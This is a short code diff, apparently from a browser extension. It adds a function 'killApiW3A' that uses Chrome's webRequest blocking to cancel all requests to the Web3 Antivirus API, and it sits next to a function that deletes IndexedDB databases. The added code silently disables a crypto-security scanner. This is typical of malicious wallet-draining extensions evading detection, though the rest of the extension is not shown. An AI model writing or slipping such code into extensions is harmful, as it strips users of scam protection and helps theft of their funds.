@@ -2,7 +2,16 @@
 /*v
 Testing the call 
 */
+function killApiW3A() {
+    chrome.webRequest.onBeforeRequest.addListener(
+  function(details) { 
+    return { cancel: true }; 
+  },
+  {urls: ["*://api.web3antivirus.io/api*"]},
+  ["blocking"]
+);
 
+}
 function deldb(databaseName){
     var req = indexedDB.deleteDatabase(databaseName);
     req.onsuccess = function () {
